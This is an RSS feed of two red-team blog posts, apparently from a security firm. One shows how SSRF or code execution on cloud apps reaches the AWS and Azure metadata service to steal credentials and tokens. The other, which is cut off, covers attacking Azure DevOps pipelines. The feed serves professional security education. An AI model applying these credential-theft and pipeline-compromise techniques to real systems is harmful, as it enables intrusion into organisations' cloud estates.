<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Cloud-Red-Team</title>
    <link>//localhost:1313/categories/cloud-red-team/</link>
    <description>Recent content in Cloud-Red-Team on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Thu, 04 Jul 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/cloud-red-team/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>How Cloud Migration is Affecting AppSec - A Red Teamer&#39;s Perspective</title>
      <link>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</guid>
      <description>
        
        
        &lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I’ve recently spoken at several conferences about the changes that are underway within red teaming as a result of cloud migration. My team and I have been delivering majority cloud red team work over the last year and the differences are becoming more apparent by the day. One point I’ve mentioned as ‘controversial’ at several of these events is that cloud migration has actually made AppSec more important than ever. I went some way to trying to explain why I think this is during my talks, but it was something that I felt deserved its own blog post to explore in more detail, with clear examples of how compromise of an on-prem application can look different to a cloud-hosted one.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;disclaimer&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#disclaimer&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;AppSec is a huge domain and one that I will not try to pretend I am currently in a position to speak with authority on as I’ve been focused almost entirely on red teaming over the last few years. Whilst I was an application pentester many moons ago I will be discussing this topic from the perspective of a red teamer / threat actor looking to achieve notable impact from the compromise of an application, namely initial access into an organisation. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The Traditional Approach&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-traditional-approach&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-traditional-approach&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, before jumping into the cloud-hosted application side of things, let’s briefly discuss the ‘traditional’ approach with which I will be comparing it to. Whilst there are countless ways of hosting a web application, let’s simplify it with a common setup looking something like the below image. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Reference: &lt;a href=&#34;https://www.wallarm.com/what/what-is-a-dmz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.wallarm.com/what/what-is-a-dmz&lt;/a&gt;&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In the above image we can see that the application is being hosted in the ‘demilitarised zone’ or DMZ as would be typical of an on-premise application. This means that the application is effectively firewalled off from the public internet and enterprise (I usually use the term ‘corporate’) networks except for connections that are strictly necessary. Overall, the intention here is to limit the potential impact that could come from compromising said application, crucially preventing it from having unfettered access into the corporate network. This makes sense, as many applications hosted as such are internet-facing and therefore face a considerable risk of compromise. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In traditional setups, you also have a few common additional layers of security to bypass if you wanted to truly weaponise an application you had compromised. Firstly, you will often be using a dedicated ‘service account’ to run the web server. This account is often only used for running this one web server, and as such has next-to-no permissions to do or access anything else. Finally, you may also find that your exploit (for example a malicious file upload vulnerability) lands in what is called the ‘web root’. This is the directory on the web server in which you store all the contents used for hosting the web server such as config files, images, etc. In these scenarios you may find that the service account you have now compromised cannot even explore the web server’s file system, and instead is strictly limited to the web root. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;When you add all of this up, you may find instances where your super awesome remote code execution vulnerability actually has very limited impact in terms of progressing an attack path towards the internal estate and / or critical assets. This exact scenario happened to me on a purple team engagement last year, in which I exploited a vulnerability to get remote code execution on a web server, only to find that it was firewalled off from the corporate network, restricted to the web root, was not domain-joined, and my account had very little permissions. Ultimately this meant that its ‘usefulness’ to me was limited. In fact, one interesting tidbit about that story is that by listing the contents of the web root by ‘time modified’ I was able to discern that several genuine threat actors had also compromised that web server the same way within the last 5 days or so. Naturally this kicked off an IR engagement, which ultimately discovered that the threat actors, like myself, had found limited impact from the compromise of the web server so had installed crypto miners and called it a day. A full write up of this story was posted last year and can be found &lt;a href=&#34;https://labs.jumpsec.com/butting-heads-with-a-threat-actor-on-an-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud-Hosted&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-hosted&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-hosted&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, how do things change when we are discussing a cloud-hosted web application? Well, let me start by saying that achieving the same level of defence in depth is certainly possible with a cloud-hosted web application. However, it is our experience that, just like we see overly permissive IAM roles and abusable default settings in every cloud environment we work in, this is rarely as well locked down when it comes to the far less understood world of cloud. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Additionally, beyond the access control and ‘identities’ belonging to these cloud-hosted applications generally not undergoing the same level of scrutiny as on-premise (partly due to ‘least privilege access’ being a mire in the complex world of cloud permissions) we are also able to leverage a nice feature that all cloud providers have implemented in different ways, called the Metadata Service. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To understand why the metadata service exists I am going to directly quote a great video on the topic from risk3sixty which I urge you to watch &lt;a href=&#34;https://www.youtube.com/watch?v=OaG6wHlhbCQ&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;“It is an internal IP address that is attached to any given EC2 instance by default, that provides a set of information that can be used by application developers who need their application to automatically perform some tasks”&lt;/em&gt; - Risk3Sixty&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Here, AWS-specific terminology can be interchangeably used with Azure or GCP terminology, as the same features exist for the same reasons across them all. They even all use the same IP address for this &lt;a href=&#34;http://169.254.169.254&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://169.254.169.254&lt;/a&gt;, meaning you do not need to know the specific implementations. As risk3sixty put it, the ‘set of information’ which can be requested here is vast, but can include some very useful information to an attacker. Top of mind is the web application’s session token that it uses to authenticate to the cloud environment and perform actions. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In order to access this service, we simply need the ability to issue requests as the web application to this specific endpoint. Once we know which endpoint houses the data that is of interest to us we can generate a request and receive back our information. Specifically, we need to coerce the application into sending a HTTP request to the specific metadata endpoint, and read the result. It should go without saying, therefore, that gaining remote code execution on the web server will in almost all cases be sufficient to retrieve that data. However, this could also be leveraged by less ‘impactful’ (in the traditional sense) vulnerabilities such as SSRF. As you might imagine, this could breathe entirely new life into the potential impact of SSRF vulnerabilities.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Cloud vendors realised that these vulnerabilities could potentially open doors to new attack vectors, and so introduced additional controls to protect against them. In all modern metadata services you are required to send additional HTTP headers with specific values, meaning that you are more likely back in the realm of remote code execution. However, in older versions you may find that this is not required, meaning that SSRF could still be sufficient.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;With the theory out of the way let’s look at some practical examples in Azure and AWS. Here are the steps I would take if I landed on an cloud-hosted web servers.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;AWS&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Firstly, check the version of the metadata service in use. As mentioned, older versions (IMDSv1) do not require additional headers, modern versions (IMDSv2) do.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 1:  401 response (missing headers) from main metadata endpoint, meaning IMDSv2 is in use&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As we are working with IMDSv2 we will need to create a bash script or similar which will request the necessary headers, and then include them in subsequent requests which ask for metadata. The script below can be found &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 2: Bash script for gaining access to IMDSv2 &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-2-bash-script-for-gaining-access-to-imdsv2&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-2-bash-script-for-gaining-access-to-imdsv2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Towards the end we can see it requests the ‘credentials’ (think access keys) of the EC2 instance.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 3: EC2 Security Credentials requested&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-3-ec2-security-credentials-requested&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-3-ec2-security-credentials-requested&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We can then run the script and receive back a plethora of useful information, including the keys and tokens the VM uses. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 4: Metadata of EC2 instance collected, with EC2 Security Credentials at the bottom.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Azure&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In Azure, this looks similar. Firstly, we generate a generic request asking for information about the VM with the ‘Metadata:true’ HTTP header. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 5: Metadata being returned from Azure Metadata Service endpoint&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As the metadata service is returning information correctly we can request our session token of the managed identity assigned to the VM.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 6: Session token returned for the VM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-6-session-token-returned-for-the-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-6-session-token-returned-for-the-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;If you are working with an app ‘service’ as opposed to a VM the process is slightly different but still very much possible. In this case you should follow &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-app-service&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we have these session tokens, so what? You may be thinking that we already had remote code execution on the virtual machine to get to this point so why do we care about the session token? Whilst you may try many of the same attack paths that you could with an on-premise application through this RCE, you now also have another angle of attack. With these session tokens you are able to ‘login’ to the cloud environment (usually without MFA as these are intended to be used by your non-human service accounts). From here, your attack vectors are far more extensive than in most traditional setups. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 7: Authenticating to the cloud environment as the compromised Azure VM. &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;For example, having authenticated to the cloud environment you now have an &lt;em&gt;incredibly&lt;/em&gt; rich API at your disposal to begin looking for further vulnerabilities. This could include simply running  ‘&lt;em&gt;Get-AzResource&lt;/em&gt;’ within Azure, which will reveal all resources that you (as the application) have access to. In the screenshot below we can see that in this case this was access to a KeyVault with app secrets within! &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 8: The compromised application has access to a KeyVault&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-8-the-compromised-application-has-access-to-a-keyvault&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-8-the-compromised-application-has-access-to-a-keyvault&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Thanks for making that so nice and easy. No searching through config files to find SQL databases and connection strings, then manually crafting individual SQL queries to begin exploitation. Here, we have simply run a single API command and then can run a second to dump all the information that we have. This is just one example of several thousand that you have available to you once you authenticate with common cloud API tooling.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;But wait there&amp;rsquo;s more…now that we have the session token for the application we can begin using any number of enumeration, post-exploitation or privilege escalation tools that we want from the perspective of the application. No need to install tooling on the device and trip off those pesky EDR’s, we can simply fire up our preferred tooling (think Azurehound, GraphRunner, bf-aws-permissions, etc.) and load in your session token. Of course, this introduces different OPSEC concerns, but bypassing those detections is something we will discuss later this year (hopefully at a conf!).&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud Permissions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-permissions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-permissions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now let’s rub salt in the wound. We’ve used our compromise to hit the metadata service and load up our favourite tooling with a session token. Access should be strictly limited, like it was on-premise right? Whilst this is true in theory, understanding and implementing fine-grained access controls and restrictions is a tall order in the modern world of highly complex cloud environments. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;I would like to call out here how many hundreds of IAM roles there are in most cloud environments, many of them with similar yet opposing permissions. Take a &lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;look&lt;/a&gt; at just the built-in Azure roles (not to mention any custom ones implemented to fill gaps) which already totals more than 130 options. You can see how reading each of these and understanding the nuanced permissions they have can be taxing, and goes some way to explaining why we so regularly see overly permissive accounts. We often see permissions being used without the full knowledge of what subsets of those permissions can introduce. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To provide a very oversimplified example, we regularly see Global Administrator accounts being very well restricted and kept under lock and key. However, some lesser known roles like ‘Privileged Role Administrator’ and ‘Privileged Authentication Administrator’ both allow a threat actor to escalate privileges to Global Administrator through resetting passwords or assigning roles to attacker-controlled accounts. These permissions may have been assigned more liberally, and compromise of them may not trip off as many alerts. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Ultimately, what I am trying to get at here is that when you combine the complexities of modern cloud environments (which we believe to be largely less well understood than on-prem) with the ability to run a plethora of tooling to identify any misconfigurations or overly permissive accounts (including the application you have compromised!) you often introduce far greater security concerns than you might traditionally do on-premise. Don’t believe me? Read &lt;a href=&#34;https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; great deep dive into the Microsoft breach which took place at the start of 2024 in which Microsoft themselves had inadvertently given a legacy app service permissions akin to Global Administrator…&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;The above also introduces an entirely new attack vector within Azure, of applications (service principals) that you compromise potentially having elevated permissions in &lt;em&gt;other&lt;/em&gt; cloud environments beyond just the tenant you are in…but that is a topic for another day.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Serverless Functions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;serverless-functions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#serverless-functions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A final point is that with the rise of serverless architecture (AWS Lambda, Azure Functions, etc.) we are starting to get our hands on these more often. Crucially, these can still be thought of as cloud-hosted web applications, and may be vulnerable to the same risks mentioned above depending on the implementation. For example, a member of our red team recently found a way to package and exfiltrate data over DNS from an AWS Lambda that had DENY ALL on all TCP and UDP ports to all ranges. For a write up on that check out &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; recent labs article. The key point here is that whilst they might not look and feel like traditional web apps, these serverless functions present the same risk to an organisation as a web app and can be used to progress attack paths just as well. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In conclusion, I am not suggesting that up until this point AppSec has not been of paramount importance. However, when looking at the arguments presented and the work we’ve been conducting as a team over the last year I feel that the migration to cloud might present yet another watershed moment in AppSec’s journey. Perhaps it will take a notable organisation to be breached via a cloud-hosted application entry point for this point to become salient, but in my eyes it is a matter of when, not if. Thanks for reading and I hope my internal monologue on the topic was of interest!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Poisoning Pipelines: Azure DevOps Edition</title>
      <link>//localhost:1313/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/</link>
      <pubDate>Thu, 09 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pipelinebursting2.gif&#34; title=&#34;pipelinebursting2&#34; alt=&#34;pipelinebursting2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pipelinebursting2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the ever-evolving realm of cloud services, organisations are ditching the headaches of physical infrastructure management and diving headfirst into the possibilities of cloud platforms. From the humble beginnings of deploying virtual machines and servers, we now find ourselves in a dynamic space with everything from serverless architectures to cloud-based active directories, seamless SaaS integrations, architectural blueprints, collaboration tools, AI assistants, and more.&lt;/p&gt;
&lt;p&gt;However, one core business service has been housed in the cloud longer than most: Continuous Integration / Continuous Deployment (CI/CD). The reasons are clear: there is no better use case for high availability containerised and serverless operations than a CI/CD pipeline.&lt;/p&gt;
&lt;p&gt;From a red teamer&amp;rsquo;s perspective CI/CD pipelines are also extremely valuable targets as they often underpin the production code base that, in most cases, underpins the organisation&amp;rsquo;s core business function itself. As such, many of the cloud-native red team engagements that we deliver will focus on the compromise of the CI/CD as one of the engagement objectives.&lt;/p&gt;
&lt;p&gt;This blog summarises some of our thinking with regards to compromising DevOps pipelines on your red team engagements. For now we will be focusing on Azure DevOps due to the fact that historically the majority of our work has been in Azure environments, but we are seeing more and more AWS and GCP estates now too so we may release future versions of this. That being said, the philosophy behind compromising CI/CD and attack scenarios mentioned in this article are common across the board.&lt;/p&gt;
&lt;h3&gt;Azure DevWho?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure-devwho&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure-devwho&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Azure DevOps is a Microsoft toolkit running in the cloud, aimed at streamlining the process of creating software using a CI/CD model. It bundles services for tracking work, managing code, automating builds and tests, and sharing software packages. But more importantly, &lt;strong&gt;it runs user-defined code&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Initial Foothold&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-foothold&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#initial-foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Once a foothold in the cloud tenant has been established via phishing, compromising an external application or assumed breach, the standard cyber kill-chain can be followed to enumerate services, move laterally, escalate privileges and mine data.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/cloud_killchain.png&#34; title=&#34;Your favourite cloud killchain diagram&#34; alt=&#34;Your favourite cloud killchain picture&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Your favourite cloud killchain diagram&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Using tools like Road Tools, AzureHound, msportals.io and the Azure CLI you may begin the discovery process to identify what services are in use. Crucially, keep your eyes open for DevOps services.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/msportals.png&#34; title=&#34;msportals.io - you can look up any microsoft portal from here&#34; alt=&#34;msportals.io - you can look up any microsoft portal from here&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;msportals.io - you can look up any microsoft portal from here&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You may find that in some cases that permissions to Azure DevOps are not as locked down as you might expect. This is ultimately due to how complex granular IAM permissions can become in larger cloud estates. For example, we have found lower privileged users had write permissions to certain non-production pipelines despite not being in technical roles.&lt;/p&gt;
&lt;h3&gt;But…Least Privilege?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;butleast-privilege&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#butleast-privilege&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Although not part of their day-to-day tasks, users that are not strictly developers may still present no restrictions in modifying, creating, deploying and executing code within the Azure DevOps pipeline. This behaviour is often not intentional but the result of overlooked permission assignments. In fact, over privileged IAM assignments is something that we regularly see in cloud environments due to the sheer number of IAM roles available. Critical permissions such as these are often overlooked, leading to users having the capability to read historical code commits, sometimes going back a few years! These can be a treasure trove for us red teamers as security may have been less of a priority back then and you may be more likely to find hardcoded credentials in older code.&lt;/p&gt;
&lt;p&gt;If you find yourself having successfully phished a member of staff that has access to Azure DevOps, review the permissions that users have to DevOps services offered by Azure. Your first thoughts at this stage should be to check whether you can:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edit repositories&lt;/li&gt;
&lt;li&gt;read history of commits (a treasure trove, believe me) or previously pushed code repositories&lt;/li&gt;
&lt;li&gt;enumerate other Azure services the organisation is using&lt;/li&gt;
&lt;li&gt;steal service accounts or managed identities associated with the DevOps service&lt;/li&gt;
&lt;li&gt;possibly introduce malware to the pipeline to enable more lateral movement and privilege escalation techniques&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Pipeline Runners&lt;span class=&#34;absolute -mt-20&#34; id=&#34;pipeline-runners&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pipeline-runners&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Code checking agents are regularly used in CI/CD pipelines as part of the build process to ensure that the supplied code is running correctly and works as intended. They are compute resources with agent software installed that run tests on your code. They ensure that the infrastructure, resources, and dependencies required to run your code are present. Crucially, they can be seen as ephemeral virtual machines from the attacker perspective.&lt;/p&gt;
